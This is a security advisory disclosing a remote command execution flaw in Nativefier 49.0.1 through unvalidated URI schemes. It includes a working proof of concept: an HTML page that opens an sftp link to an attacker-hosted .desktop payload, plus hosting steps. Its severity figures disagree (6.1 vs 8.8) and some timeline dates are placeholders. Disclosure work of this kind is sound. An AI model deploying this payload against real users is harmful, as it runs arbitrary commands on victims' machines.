---
slug: advisories/walker/
title: Nativefier 49.0.1 - RCE via malicious URI schemes
authors: Carlos Bello
writer: cbello
codename: walker
product: Nativefier 49.0.1
date: 2022-09-08 20:30 COT
cveid: CVE-2022-1959
severity: 6.1
description: Nativefier 49.0.1  -  RCE via malicious URI schemes
keywords: Fluid Attacks, Security, Vulnerabilities, Nativefier
banner: advisories-bg
advise: no
template: advisory
---

## Summary

|                       |                                                        |
| --------------------- | -------------------------------------------------------|
| **Name**              | Nativefier 49.0.1 - RCE via malicious URI schemes      |
| **Code name**         | [Walker](https://en.wikipedia.org/wiki/Alan_Walker)    |
| **Product**           | Nativefier                                             |
| **Affected versions** | Version 49.0.1                                         |
| **State**             | Private                                                |
| **Release date**      | 2022-09-08                                             |

## Vulnerability

|                       |                                                                                                        |
| --------------------- | ------------------------------------------------------------------------------------------------------ |
| **Kind**              | Remote command execution                                                                               |
| **Rule**              | [004. Remote command execution](https://docs.fluidattacks.com/criteria/vulnerabilities/004)            |
| **Remote**            | Yes                                                                                                    |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H                                                           |
| **CVSSv3 Base Score** | 8.8                                                                                                    |
| **Exploit available** | Yes                                                                                                    |
| **CVE ID(s)**         | [CVE-2022-1959](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1959)                          |

## Description

Nativefier version 49.0.1 allows an external attacker to execute
arbitrary commands remotely on any client that has used nativefier
to convert an infected web application into a desktop application.
This is made possible by the application not properly validating
the scheme/protocol of the external links it opens with the
shell.openExternal function.

## Vulnerability

This vulnerability occurs due to improper scheme/protocol validation
of external URLs:

* https://github.com/nativefier/nativefier/blob/60035a8e74e3794bac16fb5945780b9be514b164/app/src/helpers/windowEvents.ts#L62-L98

![](https://user-images.githubusercontent.com/51862990/189242160-4ef651cc-edcf-4e42-b4f3-8b01ff1cbf6b.png)

* https://github.com/nativefier/nativefier/blob/60035a8e74e3794bac16fb5945780b9be514b164/app/src/helpers/helpers.ts#L118-L163

![](https://user-images.githubusercontent.com/51862990/189242188-35d26936-a8da-4eef-9f98-f6f776c537d2.png)

* https://github.com/nativefier/nativefier/blob/60035a8e74e3794bac16fb5945780b9be514b164/app/src/helpers/helpers.ts#L169-L175

![](https://user-images.githubusercontent.com/51862990/189242216-7302a556-e9d3-47d4-ad4b-fb1345d553cd.png)

With these three screenshots we can demonstrate what was mentioned at
the beginning. Basically what the application is doing is sending to
shell.openExternal(url), any url that is not related to the origin of
the web application that was converted to a desktop application.

For example, if we execute the command:

```bash
nativefier 'http://cbelloatfluid.com'
```

And within that website there is a link pointing to http://something.com,
that link will be external, and therefore it will be opened with the
shell.openExternal function. Since the scheme/protocol of these links
is not validated, an attacker could infect legitimate web pages with
malicious JS code, so there will be potentially malicious links that
will result in remote code execution for any user who has used this
tool to generate the desktop version of the web page.

## Exploitation requirements

To achieve the RCE, the attacker will abuse certain schemes/protocols.
Some of these only work on windows, others on MACos, others only work
correctly under certain specific Linux distributions. In my case, I
used Xubuntu 20.04 (Xfce) to simulate a victim. I chose this distribution
because in its default configuration it executes the payload.desktop file
after mounting the remote location where the payload file is located.
In other Linux distributions by default these files are not executed once
the remote location is mounted.

Below I will provide you with support material so that you can understand
in greater depth what I have just explained:

* https://positive.security/blog/url-open-rce#windows-10-19042

## Exploitation

To exploit this vulnerability, you must host the following files on a server:

### exploit.html

```html
<!DOCTYPE html>
<html>
    <body>
        <script>
            window.open("sftp://user@server/uploads/payload.desktop");
        </script>
    </body>
</html>
```

### payload.desktop

In the Exec parameter you put the command you want the victim to execute.

```bash
[Desktop Entry]
Exec=xmessage "RCE by cbelloatfluid"
Type=Application
```

The **exploit.html** file will be saved in the root folder of your apache
server, while the payload.desktop file will be uploaded to the root folder
of your sftp/ftp server. In my case, I set up both services on the same
server.

With all the above done, now the client would only have to execute the
following command:

```bash
nativefier 'http://attacker-server.com/exploit.html'
```

Recall that in a real scenario, an attacker would infect a legitimate web
application with malicious JS code. This scenario is much more common and
therefore the attacker would have a higher success rate of exploitation,
performing untargeted attacks.

## Evidence of exploitation

![RCE-nativefier](https://user-images.githubusercontent.com/51862990/189242082-e3099152-713a-4dea-ae0f-d36db4999bcb.gif)

## Our security police

We have reserved the CVE-2022-1959 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: Nativefier 49.0.1

* Operating System: GNU/Linux - Xubuntu 20.04 (Xfce)

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from the Offensive
Team of `Fluid Attacks`.

## References

**Vendor page** <https://github.com/nativefier/nativefier>

## Timeline

<time-lapse
  discovered="2022-09-06"
  contacted="2022-09-07"
  replied=""
  confirmed="2022-09-00"
  patched=""
  disclosure="2022-09-00">
</time-lapse>
